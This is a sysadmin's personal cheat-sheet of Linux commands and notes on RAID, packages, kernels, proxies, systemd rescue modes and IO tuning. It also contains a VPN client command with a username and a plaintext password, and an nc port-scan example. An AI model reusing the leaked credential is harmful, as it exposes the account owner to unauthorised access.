@@ -1,0 +1,2210 @@
+git pull = git fetch + git merge
+git merge fast-forward
+############確認硬盤位置###########
+root@node-14:/dev/disk# lspci -v |grep -A1 RAID
+02:00.0 RAID bus controller: LSI Logic / Symbios Logic MegaRAID SAS 2008 [Falcon] (rev 03)
+        Subsystem: Dell PERC H310 Mini Monolithics
+--
+04:00.0 RAID bus controller: LSI Logic / Symbios Logic MegaRAID SAS 2008 [Falcon] (rev 03)
+        Subsystem: Dell PERC H310 Adapter
+結合idrac查看是哪個raid卡。注意：idrac中物理硬盤的名稱與lsscsi里位置對不上。
+root@node-14:/proc/scsi# dmesg|grep sdj|grep FAILED
+[7779092.592470] sd 7:0:2:0: [sdj] tag#0 FAILED Result: hostbyte=DID_OK driverbyte=DRIVER_SENSE
+root@node-14:/dev/disk# lsscsi
+[0:2:0:0]    disk    DELL     PERC H310        2.12  /dev/sda
+[0:2:1:0]    disk    DELL     PERC H310        2.12  /dev/sdb
+[0:2:2:0]    disk    DELL     PERC H310        2.12  /dev/sdc
+[0:2:3:0]    disk    DELL     PERC H310        2.12  /dev/sdd
+[0:2:4:0]    disk    DELL     PERC H310        2.12  /dev/sde
+[0:2:5:0]    disk    DELL     PERC H310        2.12  /dev/sdf
+[0:2:6:0]    disk    DELL     PERC H310        2.12  /dev/sdg
+[7:0:0:0]    disk    IBM-ESXS ST9900805SS      B552  /dev/sdh
+[7:0:1:0]    disk    IBM-ESXS ST9900805SS      B559  /dev/sdi
+[7:0:2:0]    disk    IBM-ESXS ST9900805SS      B552  /dev/sdj
+[7:0:3:0]    disk    IBM-ESXS ST9900805SS      B552  /dev/sdk
+[7:0:4:0]    disk    IBM-ESXS ST9900805SS      B552  /dev/sdl
+[7:0:5:0]    disk    IBM-ESXS ST9900805SS      B559  /dev/sdm
+[7:0:6:0]    disk    IBM-ESXS ST9900805SS      B552  /dev/sdn
+[7:0:7:0]    disk    IBM-ESXS ST9900805SS      B559  /dev/sdo
+root@node-14:/proc/scsi# cat /proc/scsi/scsi
+Attached devices:
+Host: scsi0 Channel: 02 Id: 00 Lun: 00
+  Vendor: DELL     Model: PERC H310        Rev: 2.12
+  Type:   Direct-Access                    ANSI  SCSI revision: 05
+...........
+Host: scsi0 Channel: 02 Id: 06 Lun: 00
+  Vendor: DELL     Model: PERC H310        Rev: 2.12
+  Type:   Direct-Access                    ANSI  SCSI revision: 05
+Host: scsi7 Channel: 00 Id: 00 Lun: 00
+  Vendor: IBM-ESXS Model: ST9900805SS      Rev: B552
+  Type:   Direct-Access                    ANSI  SCSI revision: 06
+Host: scsi7 Channel: 00 Id: 01 Lun: 00
+  Vendor: IBM-ESXS Model: ST9900805SS      Rev: B559
+  Type:   Direct-Access                    ANSI  SCSI revision: 06
+Host: scsi7 Channel: 00 Id: 02 Lun: 00
+  Vendor: IBM-ESXS Model: ST9900805SS      Rev: B552
+  Type:   Direct-Access                    ANSI  SCSI revision: 06
+.......
+Host: scsi7 Channel: 00 Id: 07 Lun: 00
+  Vendor: IBM-ESXS Model: ST9900805SS      Rev: B559
+  Type:   Direct-Access                    ANSI  SCSI revision: 06
+
+
+
+#########進制轉換#############
+ibase是输入数字的进制，而obase就是输出数字的进制了。很好记，i是input，o是output。
+　　如果用一条命令来转数字，可以用echo命令和管道结合bc。如下：
+　　10进制转2进制：
+　　$ echo "obase=2;ibase=10;100" | bc
+         1100100
+　　10进制转16进制：
+　　$ echo "obase=16;ibase=10;100" | bc
+         64
+　　16进制转10进制：
+　　$ echo "ibase=16;obase=2;F1" | bc
+        11110001
+
+redis-cli get ansible_facts127.0.0.1 |jq .ansible_memory_mb
+
+vmstat -a|awk 'NR==3{print hname " active " $6"\n" hname " inact " $5}' hname=`grep -i ^Hostname zabbix_agentd.conf |cut -d'=' -f2`
+ 
+ #########mysql#########
+ 查看表大小（MB）并排序
+ select table_name as "tables",round(((data_length + index_length) / 1024 / 1024), 2) "Size in MB" FROM information_schema.TABLES WHERE table_schema = 'zabbixdb' ORDER BY (data_length + index_length) DESC;
+ 
+ 查看分區
+ use information_schema;
+ select partition_name,table_rows from information_schema.partitions where table_name='history_uint';
+##########bonding#############
+rr mode0   balance-xor mode2   mode3   static link aggr
+802.3ad  mode4    LACP
+mode5  mode6      no need to config switch
+ 
+ ########rbd map disk without LVM################
+ If you have multipath installed on your system, make sure it is stopped before mounting the volume.
+ There is a bug which prevents the unmapping of RBD volumes.
+ # service multipath-tools stop
+ rbd map compute/309e1cca-69b4-468a-8455-91c2c80a0127_disk
+  fdisk -l /dev/rbd1
+  rbd showmapped
+  rbd unmap /dev/rbd1
+  
+###########rbd map disk with LVM ###########
+ rbd map volumes/volume-e491793b-c42a-49dd-8861-af7541225815
+ kpartx -av /dev/rbd0
+ pvscan
+ mount /dev/mapper/ubuntu--vg-root /mnt
+ ...fix files in the filesystem..
+ umount /mnt
+ vi /etc/lvm/lvm.conf
+ pvscan
+ dmsetup ls
+ dmsetup remove ubuntu--vg-swap_1 ubuntu--vg-root
+ dmsetup ls
+ dmsetup remove rbd0p5
+ rbd unmap /dev/rbd0
+ 
+###查詢安裝 升級 刪除的dpkg包### 
+pars for fun: install | remove | rollback
+function apt-history(){
+
+      case "$1" in
+        install)
+              grep 'install ' /var/log/dpkg.log
+              ;;
+        upgrade|remove)
+              grep $1 /var/log/dpkg.log
+              ;;
+        rollback)
+              grep upgrade /var/log/dpkg.log | \
+                  grep "$2" -A10000000 | \
+                  grep "$3" -B10000000 | \
+                  awk '{print $4"="$5}'
+              ;;
+        *)
+              cat /var/log/dpkg.log
+              ;;
+      esac
+}
+###########ubuntu change default gateway#### temp
+ip route change default via 10.20.0.21 dev br-fw-admin
+
+slotid=`hpacucli ctrl all show status | grep 'Smart Array'|awk '{ print $6 }'`
+hpacucli ctrl slot=$slotid pd all show status
+hpacucli ctrl slot=$slotid ld all show status
+hpacucli ctrl slot=$slotid show detail |grep 'Battery/Capacitor'
+
+####################Ubuntu 16.04 手動升级内核##############
+要升级 Ubuntu 16.04 的内核，打开 http://kernel.ubuntu.com/~kernel-ppa/mainline/ 并选择列表中需要的版本（发布此文时最新内核是 4.10.1）。
+接下来，根据你的系统架构下载 .deb 文件：
+对于 64 位系统：
+wget http://10.67.51.158/ubuntu/pool/main/l/linux-lts-xenial/linux-headers-4.4.0-75-generic_4.4.0-75.96~14.04.1_amd64.deb
+wget http://10.67.51.158/ubuntu/pool/main/l/linux-lts-xenial/linux-image-4.4.0-75-generic_4.4.0-75.96~14.04.1_amd64.deb
+wget http://10.67.51.158/ubuntu/pool/main/l/linux-lts-xenial/linux-headers-4.4.0-75_4.4.0-75.96~14.04.1_all.deb
+
+这是 32 位系统：
+$ wget http://kernel.ubuntu.com/~kernel-ppa/mainline/v4.10.1/linux-headers-4.10.1-041001_4.10.1-041001.201702260735_all.deb
+$ wget http://kernel.ubuntu.com/~kernel-ppa/mainline/v4.10.1/linux-headers-4.10.1-041001-generic_4.10.1-041001.201702260735_i386.deb
+$ wget http://kernel.ubuntu.com/~kernel-ppa/mainline/v4.10.1/linux-image-4.10.1-041001-generic_4.10.1-041001.201702260735_i386.deb
+下载完成这些所有内核文件后，如下安装：
+$ sudo dpkg -i *.deb
+安装完成后，重启并验证新的内核已经被使用了：
+$ uname -sr
+就是这样。你下载就可以使用比 Ubuntu 16.04 默认安装的内核的更新版本了。
+
+###################apt-get升級內核###################
+使用apt-get
+apt-get upgrade
+apt-get dist-upgrade           升級kernel
+
+先改變sources.list，然後apt-get upgrade & apt-get dist-upgrade  可升級release
+
+sudo apt-get install update-manager-core 
+sudo do-release-upgrade
+LTS systems are only automatically considered for an upgrade to the next LTS via do-release-upgrade with the first point release. 
+So for example 14.04 will only upgrade once 16.04.1 is released.
+
+Traditionally, Debian releases have been upgradeable by changing Apt's /etc/apt/sources.list, 
+which specifies package repositories, and using apt-get dist-upgrade to perform the upgrade itself. 
+Ubuntu is still a Debian-derived distribution, so this process would likely still work. 
+Instead, however, we'll use do-release-upgrade, a tool provided by the Ubuntu project, 
+which handles checking for a new release, updating sources.list, and a range of other tasks. 
+This is the officially recommended upgrade path for server upgrades which must be performed over a remote connection.
+
+Before doing a release upgrade, create a snapshot of your Droplet. 
+Upgrading releases can lead to some rather unexpected results if your application 
+isn't compatible with new software versions that will be installed when you upgrade.
+
+For example, I'll use PHP. Older Ubuntu versions have PHP 5.x in their repositories 
+while the newer releases have PHP 7.0.x. When performing a release upgrade, PHP 5.x becomes 7.0.x, 
+so any PHP applications on the server that are not fully compatible with PHP 7.0 break instantly.
+
+The same is true for many languages.
+##############apt-mirror behind proxy ######
+apt-get install apt-mirror
+Configure wget (which is used by apt-mirror) to go through 
+the http proxy by editing /etc/wgetrc and enabling the following options
+ (skip this one if you aren’t using a http proxy to connect to the internet)
+http_proxy
+use_proxy
+su - apt-mirror -c apt-mirror
+
+###########kvm manual migration#########
+[root@kvmserver-ops ~]# cat copy.sh
+#!/bin/bash
+vmlist=`virsh list --all|sed -n '1,2!p'|awk '{print $2}'`
+for u in $vmlist
+do
+file=`virsh domblklist $u|awk '/qcow2/{print $2}'`
+date | tee -a /root/copy.log
+echo "start to scp $file..."|tee -a /root/copy.log
+scp $file kvmserver2:/var/lib/libvirt/images
+echo "copy of $file is completed !!"|tee -a /root/copy.log
+done
+
+
+#########linux tcp monitoring#######
+查看系统tcp连接中各个状态的连接数
+ 
+netstat -an | awk '/^tcp/ {++S[$NF]} END {for(a in S) print a, S[a]}'
+ 
+输出每个ip的连接数，以及总的各个状态的连接数。
+ 
+netstat -n | awk '/^tcp/ {n=split($(NF-1),array,":");if(n<=2)++S[array[(1)]];else++S[array[(4)]];++s[$NF];++N} END {for(a in S){printf("%-20s %s\n", a, S[a]);++I}printf("%-20s %s\n","TOTAL_IP",I);for(a in s) printf("%-20s %s\n",a, s[a]);printf("%-20s %s\n","TOTAL_LINK",N);}'
+#########git ##########
+git checkout -b test
+git status
+git branch
+vi README.md
+git status
+git add README.md
+git commit README.md
+git status
+git log --branches --not --remotes
+git push origin test
+git config --global credential.helper 'cache --timeout=7200'
+
+###########linux network###########
+Linux 上配置網絡設備命令舉例
+以 Redhat6.2 紅帽Linux 發行版為例，如果已安裝 VLAN 內核模塊和管理工具 vconfig，TAP/TUN 設備管理工具 tunctl，那麼可以用以下命令設置前述網絡設備：
+Bridge 操作
+* 創建 Bridge：brctl addbr [BRIDGE NAME]
+* 刪除 Bridge：brctl delbr [BRIDGE NAME]
+* attach 設備到 Bridge：brctl addif [BRIDGE NAME] [DEVICE NAME]
+* 從 Bridge detach 設備：brctl delif [BRIDGE NAME] [DEVICE NAME]
+* 查詢 Bridge 情況：brctl show
+
+VLAN 設定
+* 創建 VLAN 設備：vconfig add [PARENT DEVICE NAME] [VLAN ID]
+* 刪除 VLAN 設備：vconfig rem [VLAN DEVICE NAME]
+* 設置 VLAN 設備 flag：vconfig set_flag [VLAN DEVICE NAME] [FLAG] [VALUE]
+* 設置VLAN 設備qos：
+-- vconfig set_egress_map [VLAN DEVICE NAME] [SKB_PRIORITY] [VLAN_QOS]
+-- vconfig set_ingress_map [VLAN DEVICE NAME] [SKB_PRIORITY] [VLAN_QOS]
+* 查詢VLAN 設備情況：cat /proc/net/vlan/[VLAN DEVICE NAME]
+
+VETH & TAP 設定
+* 創建 VETH 設備：ip link add link [DEVICE NAME] type veth
+* 創建 TAP 設備：tunctl -p [TAP DEVICE NAME]
+* 刪除 TAP 設備：tunctl -d [TAP DEVICE NAME]
+* 查詢系統裡所有二層設備，包括 VETH/TAP 設備：ip link show
+
+其他相關設定
+* 刪除普通二層設備：ip link delete [DEVICE NAME] type [TYPE]
+
+######rhel5.8 using virtio ##########
+mkinitrd --with virtio_pci --with virtio_blk --with virtio -f /boot/initrd-$(uname-r).img $(uname -r)
+
+##########dpkg ##########
+Ubuntu中所有packages的信息都在/var/lib/dpkg/目录下,其中子目录”/var/lib/dpkg/info”用于保存各个软件包的配置文件列表.不同后缀名代表不同类型的文件,如:
+             .conffiles 记录了软件包的配置文件列表
+             .list 保存软件包中的文件列表,用户可以从.list的信息中找到软件包中文件的具体安装位置.
+             .md5sums 记录了软件包的md5信息,这个信息是用来进行包验证的.
+             .prerm 脚本在Debian报解包之前运行,主要作用是停止作用于即将升级的软件包的服务,直到软件包安装或升级完成.
+             .postinst脚本是完成Debian包解开之后的配置工作,通常用于执行所安装软件包相关命令和服务重新启动.
+              /var/lib/dpkg/available文件的内容是软件包的描述信息,该软件包括当前系统所使用的Debian安装源中的所有软件包,其中包括当前系统中已安装的和未安装的软件包.
+dpkg -s acl            ## check status of package
+dpkg -S /usr/bin/rados    #find file belong to which package
+dpkg -L acl              ## list the files of package
+dpkg -l acl              ## query package
+dpkg -p ceph-common      ## details info about package
+root@apt-repo:~# dpkg --get-selections linux*
+linux-firmware                                  install
+linux-generic                                   install
+linux-headers-3.13.0-24                         install
+linux-headers-3.13.0-24-generic                 install
+linux-headers-generic                           install
+linux-image-3.13.0-24-generic                   install
+linux-image-extra-3.13.0-24-generic             install
+linux-image-generic                             install
+
+
+aptitude update #更新可用的包列表 
+aptitude upgrade #升级可用的包 
+aptitude dist-upgrade #将系统升级到新的发行版 
+aptitude install pkgname #安装包 
+aptitude remove pkgname #删除包 
+aptitude purge pkgname #删除包及其配置文件 
+aptitude search string #搜索包 
+aptitude show pkgname #显示包的详细信息 
+aptitude clean #删除下载的包文件 
+aptitude autoclean #仅删除过期的包文件
+-h：显示帮助信息； 
+-d：仅下载软件包，不执行安装操作； 
+-P：每一步操作都要求确认； 
+-y：所有问题都回答“yes”； 
+-v：显示附加信息； 
+-u：启动时下载新的软件包列表。
+
+确保您的软件包列表是最新的： apt-get update 
+安装一个新软件包： apt-get install packagename 
+卸载一个已安装的软件包（保留配置文件）： apt-get remove packagename 
+卸载一个已安装的软件包（删除配置文件）： apt-get –purge remove packagename 
+会把已装或已卸的软件都备份在硬盘上，所以如果需要空间的话，可以让这个命令来删除你已经删掉的软件： apt-get autoclean apt 
+这个命令会把安装的软件的备份也删除，不过这样不会影响软件的使用的： apt-get clean 
+更新所有已安装的软件包： apt-get upgrade 
+将系统升级到新版本： apt-get dist-upgrade 
+定期运行这个命令来清除那些已经卸载的软件包的.deb文件。通过这种方式，您可以释放大量的磁盘空间。如果您的需求十分迫切，
+可以使用apt-get clean以释放更多空间。这个命令会将已安装软件包裹的.deb文件一并删除。
+大多数情况下您不会再用到这些.debs文件，因此如果您为磁盘空间不足 而感到焦头烂额，这个办法也许值得一试： apt-get autoclean
+
+来自: http://man.linuxde.net/apt-get
+###########xen server##########
+xe-toolstack-restart >> will shutdown halted yellow vm and then you could delete it. 
+using uuid as above or manually right click and delete it.
+To list the VM's on the server : xe vm-list
+
+Commands to remove the VM:
+
+xe vm-destroy uuid=9292d664-81b8-75b1-a251-7ca4e0f4eceb
+xe vm-destroy uuid=8af33a4d-54fe-ff31-0797-5036996bad83
+
+Command to list the Virtual Disks: lvscan
+
+Commands to remove the Virtual Disks:
+
+xe vdi-destroy uuid=9292d664-81b8-75b1-a251-7ca4e0f4eceb
+xe vdi-destroy uuid=0a553992-c048-445c-99cf-a0c872a7ff57
+
+
+################parted############
+parted /dev/sdb mklabel gpt yes
+ parted /dev/sda mkpart primary 216G 416G ignore
+ parted /dev/sda p
+ partprobe /dev/sda
+ lvextend -l +100%FREE -r /dev/mapper/os-root
+###############jenkins#############
+
+yum install java-1.7.0-openjdk
+curl -o jenkins.repo http://pkg.jenkins-ci.org/redhat-stable/jenkins.repo
+rpm --import https://jenkins-ci.org/redhat/jenkins-ci.org.key
+yum install -y jenkins
+
+########SSL
+java InstallCert 10.67.44.66
+cp jssecacerts /etc/alternatives/jre/lib/security/
+keytool -list -alias 10.67.44.66-1
+openssl s_client -connect 10.67.44.66:443 < /dev/null | sed -ne '/-BEGIN CERTIFICATE-/,/-END CERTIFICATE-/p' > public.crt
+keytool -import -alias 10.67.44.66-1 -keystore /etc/alternatives/jre/lib/security/cacerts -file public.crt
+java SSLPoke 10.67.44.66 443
+################dante################
+[root@proxy ~]# cat /etc/sockd.conf
+internal: ens9   port = 1080
+external: eth1
+
+user.privileged:   root
+user.unprivileged: nobody
+socksmethod:       none
+errorlog: /var/log/sockd.errlog
+logoutput: /var/log/sockd.log
+
+# LAN
+client pass {
+    from: 10.67.50.0/23 to: 0.0.0.0/0
+    log: error connect # disconnect
+}
+
+# allow connect from anywhere as long as client was authed previously
+socks pass {
+    from: 0.0.0.0/0 to: 0.0.0.0/0
+    command: connect
+    log: error connect # disconnect
+}
+[root@cobbler ansible]# cat ~/.ssh/config
+#Host 10.20.0.8
+#  ProxyCommand connect-proxy -S 10.67.51.159 %h %p
+Host 10.20.0.*
+  ProxyCommand connect-proxy -S 10.67.51.159 %h %p
+
+
+###################mrepo##############
+[root@yumserver6 mrepo.conf.d]# grep createrepo-options /usr/bin/mrepo
+        self.createrepooptions = self.getoption('main', 'createrepo-options', '-p -s sha1')    ###centos5用sha1的加密算法
+
+
+[CentOS5]
+name = CentOS $release ($arch)
+release = 5
+arch = x86_64
+metadata = yum repomd
+
+#iso=CentOS-5.11-x86_64-bin-DVD1.iso
+os=http://mirrors.aliyun.com/centos/$release/os/$arch/CentOS/
+updates=http://mirrors.aliyun.com/centos/$release/updates/$arch/RPMS/
+extras=http://mirrors.aliyun.com/centos/$release/extras/$arch/RPMS/
+epel=http://mirrors.aliyun.com/epel/5/$arch/
+
+
+[CentOS6]
+name = CentOS $release ($arch)
+release = 6
+arch = x86_64
+metadata = yum repomd
+
+#iso=CentOS-6.5-x86_64-bin-DVD1.iso
+os=http://mirrors.aliyun.com/centos/$release/os/$arch/Packages/
+updates=http://mirrors.aliyun.com/centos/$release/updates/$arch/Packages/
+extras=http://mirrors.aliyun.com/centos/$release/extras/$arch/Packages/
+epel=http://mirrors.aliyun.com/epel/6/$arch/
+
+cat /etc/mrepo.conf
+### Configuration file for mrepo
+
+### The [main] section allows to override mrepo's default settings
+### The mrepo-example.conf gives an overview of all the possible settings
+[main]
+srcdir = /var/mrepo
+wwwdir = /var/www/mrepo
+confdir = /etc/mrepo.conf.d
+arch = x86_64
+http_proxy=http://10.67.61.205:808
+https_proxy=http://10.67.61.205:808
+ftp_proxy=http://10.67.61.205:808
+
+mailto = root@localhost
+smtp-server = localhost
+
+######################################
+列出所有与192.168.56.1（我的宿主机IP地址）的ipv4连接：
+fgp@controller:~$ lsof -i 4@192.168.56.1
+
+一个经典的用法是端口扫描。比如我要扫描192.168.56.2主机1~100端口
+nc -zv 192.168.56.2 1-100 |& grep 'succeeded!'
+###############firewall-cmd###############
+To open port 80 (http) in your firewall, you can utilize the following command:
+[root@srv ]# firewall-cmd --permanent --zone=public --add-port=80/tcp
+ 
+Reload the firewall to apply changes:
+[root@srv ]# firewall-cmd --reload
+#############samba############
+smbclient -L //10.67.50.89 -U "cesbg\h7108579"
+smbclient --user="cesbg\h7108579" //10.67.50.89/OVA
+mount -t cifs -r -o username=cesbg/h7108579 //10.67.50.89/OVA /mnt/OVA
+mount -t cifs -r -o username=cesbg/h7108579 //10.67.50.93/IT /mnt/IT
+#################.functions##################
+dokeychainmagic() {
+ checkagent=`ps auxww|egrep -v 'grep|defunct|gnome-session'|grep ^${USER}|grep -i ssh-agent|wc -l|awk '{print $1}'`
+ if [ "${checkagent}" -eq "0" ]; then
+    check-agent
+    dokeychainmagic
+ fi
+
+#unset SSH_ASKPASS
+
+ if [ -x /usr/bin/keychain ] && [ -f $HOME/.ssh/id_dsa ] && [ "$checkagent" -le "1" ]; then
+   /usr/bin/keychain $HOME/.ssh/id_rsa --quiet >/dev/null 2>&1
+   source $HOME/.keychain/${HOSTNAME}-sh
+ else
+  if [ -f $HOME/.keychain/${HOSTNAME}-sh ] && [ "$checkagent" -ge "1" ]; then
+   source $HOME/.keychain/${HOSTNAME}-sh
+  fi
+ fi
+}
+
+# checks to see if theres an ssh-agent running
+check-agent() {
+ checkagent=`ps auxww|egrep -v 'grep|defunct|gnome-session'|grep ^${USER}|grep -i ssh-agent|wc -l|awk '{print $1}'`
+ if [ "${checkagent}" -eq "0" ]; then
+  echo "there is no ssh-agent running for ${USER}"
+  echo "Now, run ssh-agent for ${USER}..."
+   /usr/bin/keychain ~/.ssh/id_rsa
+#  exit 101
+ fi
+}
+
+#################RHEL 7#####################
+is-system-running
+
+systemd.unit=emergency.target        -maintenance
+-------------------------------------------------
+need root password
+-------------------------------------------------
+running processes
+systemd --switched-root --system --deserialize 21
+systemd-journald
+sh -c /usr/sbin/sulogin; /usr/bin/systemctl --fail --no-block default
+-------------------------------------------------
+no IP, root filesystem read-only  
+ssm list show device,vg,filesystem
+-------------------------------------------------
+/run directory
+blkid initramfs lock log mount plymouth systemd tmpfiles.d udev
+---------------------------------------------------------------
+not able to run "systemctl start network"
+----------------------------------------------------------------
+
+systemd.unit=rescue.target        -maintenance
+----------------------------------------------------------------
+need root password
+----------------------------------------------------------------
+running processes
+/usr/lib/systemd/systemd --switched-root --system --deserialize 21
+/usr/lib/systemd/systemd-journald
+/usr/sbin/lvmetad -f
+/usr/lib/systemd/systemd-udevd
+sh -c /usr/sbin/sulogin; /usr/bin/systemctl --fail --no-block default
+----------------------------------------------------------------
+no IP, root filesystem read and write
+ssm list show device,vg,filesystem
+----------------------------------------------------------------
+/run directory
+blkid initramfs lock log mount plymouth systemd tmpfiles.d udev console faillock lock lvm netreport ppp sepermit setrans tuned user utmp nologin lvmetad.pid dmeventd-client dmeventd-server
+able to run "systemctl start network", sshd
+----------------------------------------------------------------
+
+rd.break            -starting
+----------------------------------------------------------------   
+found Root device,check root filesystem. start dracut initqueue hook, pre-mount hook,mounted /sysroot. 
+Reached target initrd file systems.starting initrd file systems. starting dracut pre-pivot and cleanup hook.
+Break before switch_root, starting dracut emergency shell
+----------------------------------------------------------------
+root password is not needed.
+----------------------------------------------------------------
+running processes.
+/init rhgb
+/usr/lib/systemd/systemd-journald
+/usr/lib/systemd/systemd-udevd
+sh /bin/dracut-pre-pivot
+systemctl start dracut-emergency.service
+----------------------------------------------------------------
+NO IP.root filesystem read-only
+----------------------------------------------------------------
+/run directory
+blkid initramfs lock log mount plymouth systemd tmpfiles.d udev
+----------------------------------------------------------------
+after chroot to /sysroot
+can't observe running process
+memroy in /proc is none, can't issue "mount, free -m,lvm lvs,df"
+
+runlevle switch
+systemctl rescue
+systemctl default
+############python simple HTTP server##########
+python -m SimpleHTTPServer 80
+###########cgroup##############
+echo 40000 > /cgroup/cpu/libvirt/qemu/cpu.cfs_quota_us   
+cgset -r cpu.cfs_quota_us=40000 libvirt/qemu/
+cgget -g cpu libvirt/qemu/
+lscgroup
+############################IO tuning############
+avgrq-sz = ( rsec/s + wsec/s ) / (  r/s + w/s )
+  262.76 = (69175.98+ 3081.04) / (250.49+24.50) within the highlighted sample line 
+
+The svctm field is simply calculated from ( %util * 1000ms / #completed io per second ). 
+For example, ( 20.6% * 1000ms / 274.99 ) = 0.729ms per io
+svctm   = ( %util * 1000ms ) / (   r/s + w/s ) device "busy" time / # of completed io
+0.729ms = ( 20.6% * 1000ms ) / ( 250.49+24.50) which the highlighted sample line
+
+cat /sys/block/<sdX>/device/queue_depth
+#lsscsi -l
+
+The value of nr_requests determines the amount of I/O requests that get buffered before the I/O scheduler sends / receives data to the block device, if you are using a RAID card / Block Device that can handle a larger queue than what the I/O scheduler is set to, raising the value of nr_requests may help to improve throughout and reduce server load when large amounts of I/O occur on the server. If you are using Deadline or CFQ as the scheduler, it is suggested that you should set the nr_request value to 2 times the value of queue depth.
+
+echo 256 > /sys/block/sda/queue/nr_requests
+
+[root@oc1181188062 queue]# cat /sys/block/sda/queue/nr_requests 
+128
+[root@oc1181188062 queue]# cat /sys/block/sda/device/queue_depth 
+31
+#sg_map -x
+cfibml05:/proc/scsi/sg # cat /proc/scsi/sg/devices 
+0	2	0	0	0	1	256	0	1
+H       C       I       L       type           QD
+What is queue depth?
+The number of simultaneous requests on a drive's request queue
+queue depth of the disk controller
+############set up ulimit for service############
+Add the desired ulimit command(s) to /etc/sysconfig/<SERVICENAME>, for example:
+Raw
+
+echo "ulimit -SHn 8192   # nofile" >>/etc/sysconfig/httpd
+echo "ulimit -SHu 10240  # nproc" >>/etc/sysconfig/httpd
+
+Restart the service and check /proc/<PID>/limits output
+For example:
+Raw
+
+~]# service httpd restart
+Stopping httpd:                                            [  OK  ]
+Starting httpd:                                            [  OK  ]
+~]# cat /proc/$(</var/run/httpd/httpd.pid)/limits
+Limit                     Soft Limit           Hard Limit           Units     
+Max cpu time              unlimited            unlimited            seconds   
+Max file size             unlimited            unlimited            bytes     
+Max data size             unlimited            unlimited            bytes     
+Max stack size            10485760             unlimited            bytes     
+Max core file size        0                    unlimited            bytes     
+Max resident set          unlimited            unlimited            bytes     
+Max processes             10240                10240                processes 
+Max open files            8192                 8192                 files     
+Max locked memory         65536                65536                bytes     
+Max address space         unlimited            unlimited            bytes     
+Max file locks            unlimited            unlimited            locks     
+Max pending signals       7388                 7388                 signals   
+Max msgqueue size         819200               819200               bytes     
+Max nice priority         0                    0                    
+Max realtime priority     0                    0                    
+Max realtime timeout      unlimited            unlimited            us        
+################/etc/resolv.conf###########
+    The /etc/resolv.conf file will be overwritten if any network interfaces use DHCP for activation.
+    To prevent this, ensure such interfaces have PEERDNS=no set in their ifcfg file, for example:
+    Raw
+
+    $ cat /etc/sysconfig/network-scripts/ifcfg-eth1
+    TYPE=Ethernet
+    DEVICE=eth1
+    BOOTPROTO=dhcp
+    PEERDNS=no
+
+    The ifcfg-file directives DNS1 and DNS2 can also lead to modification of resolv.conf.
+    To prevent this, either remove said directives or use chattr(1) to make resolv.conf immutable to changes, i.e.:
+    Raw
+
+    # chattr +i /etc/resolv.conf
+
+    If a single ifcfg-file both specifies a nameserver using DNS1 and also gets a nameserver via DHCP, both nameservers will be placed in resolv.conf, for example:
+    Raw
+
+    $ cat /etc/sysconfig/network-scripts/ifcfg-eth1
+    TYPE=Ethernet
+    DEVICE=eth1
+    BOOTPROTO=dhcp
+    DNS1=10.0.0.254
+    $ cat /etc/resolv.conf
+    nameserver 192.168.0.254
+    nameserver 10.0.0.254
+
+    To prevent the use of the nameserver returned by DHCP, add PEERDNS=no to the ifcfg-file
+##############unpack and repack initrd#########
+    Create a directory and switch into it:
+# mkdir test
+# cd test
+
+    Then uncompress and extract the initrd:
+# zcat /boot/initrd-2.6.18-164.6.1.el5.img | cpio -idmv
+
+    Edit the contents (if needed)
+    Finally repack and compress the initrd image:
+# find . | cpio -o -c | gzip -9 > /boot/test.img
+
+#####################array_vpn client############3
+/usr/local/array_vpn/array_vpnc64 -hostname vpn.hkg02.softlayer.com --username djsen -passwd Aq1sw@de3 -port 443
+
+##############test socks ruleset############################
+connect -d -S 129.39.109.217 10.225.0.175 22
+code:
+ 	     o  X'00' succeeded
+             o  X'01' general SOCKS server failure
+             o  X'02' connection not allowed by ruleset
+             o  X'03' Network unreachable
+             o  X'04' Host unreachable
+             o  X'05' Connection refused
+             o  X'06' TTL expired
+             o  X'07' Command not supported
+             o  X'08' Address type not supported
+			 
+######################check all cronjob on server#############################
+for u in `grep -v '#' /etc/cron.allow`;do echo "========$u=========";crontab -u $u -l|egrep -v '^#|^$';done
+
+#######################################
+If you upgrade from RHEL 5 to an unsupported kernel, you might not be able to access data on the virtual machine's PVSCSI disks. 
+You can run vmware-config-tools.pl with the kernel-version parameter to regain access. 
+
+###########run in background######
+nohup cmd &
+setsid cmd
+(cmd &)
+CTRL-z    disown -h %1      https://linux.cn/article-7170-1.html
+screen
+
+##########backup file permission#########
+backup:   getfacl -R . > permission.txt
+restore:  setfacl --restore=permission.txt
+
+#####################SHC#######################
+#1   b23leimysql01:~/shc_no_ep           # modify it and distribute it
+pssh -h djs_srvlist --inline-stdout "rm -rf prerequisites/"
+pssh -h djs_srvlist --inline-stdout "rm -rf LittleFix/SHCResults/"
+pssh -h djs_srvlist --inline-stdout "rm -rf SHC/"
+pscp -h djs_srvlist -r prerequisites/ /home/chensen/
+pssh -h djs_srvlist --inline-stdout "touch -d 'yesterday' prerequisites/"
+pscp -h djs_srvlist shc_no_ep /home/chensen/
+
+#2
+run cssh
+./shc_no_ep --cust DJS >manualhc 2>&1
+cat manualhc |sed -n '/Task\ 4/,/Task\ 5/p' >`hostname -s`_manualhc_`date +%Y%m%d`.txt
+chown chensen `hostname -s`_manualhc_`date +%Y%m%d`.txt
+
+#3
+run another Littlefix policy   SITS-GSDISEC
+pssh -h djs_srvlist -x '-t -t' --inline-stdout "cd LittleFix/;sudo ./LittleFix-unix.exe-linux-x86-64 -x SITS-GSDISEC-V4.0C_UNIX-SUDO_20160412.POLICY"
+pssh -h djs_srvlist -x '-t -t' --inline-stdout "sudo chown -R chensen LittleFix/"
+
+#4
+pslurp -h djs_srvlist -t 0 -l chensen -r /home/chensen/LittleFix/SHCResults .
+pssh -h djs_srvlist --inline-stdout "mkdir SHC;mv *`date +%Y%m%d`* SHC/"
+pslurp -h djs_srvlist -t 0 -l chensen -r /home/chensen/SHC .
+###included in shc_no_ep###########
+zip `hostname -s`_shc_20160510.zip `find ~chensen/prerequisites ! -type d -a  -newer prerequisites | egrep 'csv|log|txt'`
+
+####################scan sparse file larger than 1GB##########
+while read num file;do if [[ $(($num)) -lt 0 ]];then echo $file $(($num));fi;done< <(find / -type f -size +1G -print0|tee|xargs -0 stat -c "%b*%B-%s %n" --)
+
+##################koan######################
+[root@localhost ~]# koan --list=profiles --server=192.168.124.200
+- looking for Cobbler at http://192.168.124.200:80/cobbler_api
+centos-6.5-x86_64
+centos-6.5-x86_64-basic
+[root@localhost ~]# koan --replace-self --server=192.168.124.200 --profile=centos-6.5-x86_64-basic
